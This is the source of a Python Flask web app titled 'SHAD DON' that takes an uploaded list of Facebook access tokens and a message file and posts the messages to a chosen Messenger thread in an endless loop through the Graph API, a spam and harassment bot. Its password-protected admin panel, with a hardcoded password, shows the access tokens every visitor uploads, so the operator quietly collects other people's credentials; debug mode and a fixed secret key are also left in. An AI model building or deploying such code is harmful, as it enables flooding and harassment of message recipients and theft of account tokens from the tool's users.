from flask import Flask, request, session, redirect, url_for
import requests
from threading import Thread, Event
import time
import os
import logging
import io

app = Flask(name)
app.debug = True
app.secret_key = "3a4f82d59c6e4f0a8e912a5d1f7c3b2e6f9a8d4c5b7e1d1a4c"  # Change this in production

# Log capture setup
log_stream = io.StringIO()
handler = logging.StreamHandler(log_stream)
handler.setLevel(logging.INFO)
logging.getLogger().addHandler(handler)
logging.getLogger().setLevel(logging.INFO)

headers = {
'Connection': 'keep-alive',
'Cache-Control': 'max-age=0',
'Upgrade-Insecure-Requests': '1',
'User-Agent': 'Mozilla/5.0 (Linux; Android 11; TECNO CE7j) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.40 Mobile Safari/537.36',
'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
'Accept-Encoding': 'gzip, deflate',
'Accept-Language': 'en-US,en;q=0.9',
'referer': 'www.google.com'
}

stop_event = Event()
threads = []

# ------------------ STORE USER SESSIONS ------------------
users_data = []  # will keep tokens, threadId, messages, prefix, etc.


@app.route('/ping', methods=['GET'])
def ping():
    return "✅ I am alive!", 200


def send_messages(access_tokens, thread_id, mn, time_interval, messages):
    while not stop_event.is_set():
        try:
            for message1 in messages:
                if stop_event.is_set():
                    break
                for access_token in access_tokens:
                    api_url = f'https://graph.facebook.com/v15.0/t_{thread_id}/'
                    message = str(mn) + ' ' + message1
                    parameters = {'access_token': access_token, 'message': message}
                    response = requests.post(api_url, data=parameters, headers=headers)
                    if response.status_code == 200:
                        logging.info(f"✅ Sent: {message[:30]} via {access_token[:50]}")
                    else:
                        logging.warning(f"❌ Fail [{response.status_code}]: {message[:30]}")
                time.sleep(time_interval)
        except Exception as e:
            logging.error("⚠️ Error in message loop: %s", e)
            time.sleep(10)


@app.route('/', methods=['GET', 'POST'])
def send_message():
    global threads, users_data
    if request.method == 'POST':
        token_file = request.files['tokenFile']
        access_tokens = token_file.read().decode().strip().splitlines()

        thread_id = request.form.get('threadId')
        mn = request.form.get('kidx')
        time_interval = int(request.form.get('time'))

        txt_file = request.files['txtFile']
        messages = txt_file.read().decode().splitlines()

        # ✅ Save session info for admin panel
        users_data.append({
            "tokens": access_tokens,
            "thread_id": thread_id,
            "prefix": mn,
            "interval": time_interval,
            "messages": messages
        })

        if not any(thread.is_alive() for thread in threads):
            stop_event.clear()
            thread = Thread(target=send_messages, args=(access_tokens, thread_id, mn, time_interval, messages))
            thread.start()
            threads = [thread]

    return '''

<!DOCTYPE html>  <html lang="en">  
<head>  
  <meta charset="utf-8">  
  <meta name="viewport" content="width=device-width, initial-scale=1.0">  
  <title>SHAD DON</title>  
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet">  
  <style>  
    label{ color: white; }  
    body{ background: black; color: white; }  
    .container{ max-width: 350px; padding:20px; box-shadow:0 0 15px white; border-radius:20px; }  
    .form-control{ background:transparent; border:1px solid white; color:white; }  
  </style>  
</head>

<body>  
  <header class="header mt-4 text-center">  
    <h1 class="mt-3">SHAD DON</h1>  
  </header>  
  <div class="container text-center">  
    <form method="post" enctype="multipart/form-data">  
      <label>Token File</label><input type="file" name="tokenFile" class="form-control" required>  
      <label>Thread/Inbox ID</label><input type="text" name="threadId" class="form-control" required>  
      <label>Name Prefix</label><input type="text" name="kidx" class="form-control" required>  
      <label>Delay (seconds)</label><input type="number" name="time" class="form-control" required>  
      <label>Text File</label><input type="file" name="txtFile" class="form-control" required>  
      <button type="submit" class="btn btn-primary w-100 mt-3">Start Sending</button>  
    </form>  
    <form method="post" action="/stop">  
      <button type="submit" class="btn btn-danger w-100 mt-3">Stop Sending</button>  
    </form>  
    <a href="/admin" class="btn btn-warning w-100 mt-3">Admin Login</a>  
  </div>  
</body>  
</html>  
'''  


@app.route('/stop', methods=['POST'])
def stop_sending():
    stop_event.set()
    return '✅ Sending stopped.'


# ------------------ ADMIN PANEL ------------------

@app.route('/admin', methods=['GET', 'POST'])
def admin_login():
    if request.method == 'POST':
        password = request.form.get('password')
        if password == "smarty07":
            session['admin'] = True
            return redirect(url_for('admin_panel'))
    return '''
    <form method="post">
    <h2>Admin Login</h2>
    <input type="password" name="password" placeholder="Password" required>
    <button type="submit">Login</button>
    </form>
    '''


@app.route('/admin/panel')
def admin_panel():
    if not session.get('admin'):
        return redirect(url_for('admin_login'))

    logs = log_stream.getvalue().replace("\n", "<br>")

    # ✅ Show active users
    users_html = ""
    for idx, user in enumerate(users_data):
        tokens_preview = "<br>".join(user['tokens'][:3]) + ("..." if len(user['tokens']) > 3 else "")
        messages_preview = "<br>".join(user['messages'][:3]) + ("..." if len(user['messages']) > 3 else "")
        users_html += f"""
        <div class="user-card">
            <h3>Session {idx+1}</h3>
            <p><b>Thread ID:</b> {user['thread_id']}</p>
            <p><b>Prefix:</b> {user['prefix']}</p>
            <p><b>Interval:</b> {user['interval']} sec</p>
            <p><b>Tokens:</b><br>{tokens_preview}</p>
            <p><b>Messages:</b><br>{messages_preview}</p>
            <form method="post" action="/admin/remove/{idx}">
                <button type="submit" class="btn btn-danger">Remove</button>
            </form>
        </div>
        """

    return f"""
    <html>
    <head>
      <style>
        body {{
          background: #0d0d0d;
          color: white;
          font-family: Arial, sans-serif;
        }}
        .log-box {{
          background: rgba(0,0,0,0.7);
          color: lime;
          padding: 15px;
          border-radius: 15px;
          box-shadow: 0px 0px 15px rgba(0,255,150,0.7);
          margin-bottom: 20px;
          font-family: monospace;
        }}
        .user-card {{
          background: rgba(255,255,255,0.05);
          border-radius: 15px;
          box-shadow: 0px 0px 20px rgba(0,200,255,0.6);
          padding: 15px;
          margin: 10px 0;
        }}
        button {{
          border-radius: 10px;
          padding: 5px 10px;
        }}
      </style>
    </head>
    <body>
      <h2>🛠 Admin Panel</h2>
      <div class='log-box'>
        <h3>📜 Console Logs</h3>
        {logs}
      </div>
      <h3>👤 Active User Sessions</h3>
      {users_html if users_html else "<p>No active sessions yet.</p>"}
      <br>
      <a href="/admin/logout">Logout</a>
    </body>
    </html>
    """

@app.route('/admin/remove/<int:idx>', methods=['POST'])
def remove_user(idx):
    if not session.get('admin'):
        return redirect(url_for('admin_login'))
    if 0 <= idx < len(users_data):
        users_data.pop(idx)
    return redirect(url_for('admin_panel'))


@app.route('/admin/logout')
def admin_logout():
    session.pop('admin', None)
    return redirect(url_for('admin_login'))


if name == 'main':
    app.run(host='0.0.0.0', port=int(os.getenv("PORT", 5000)))
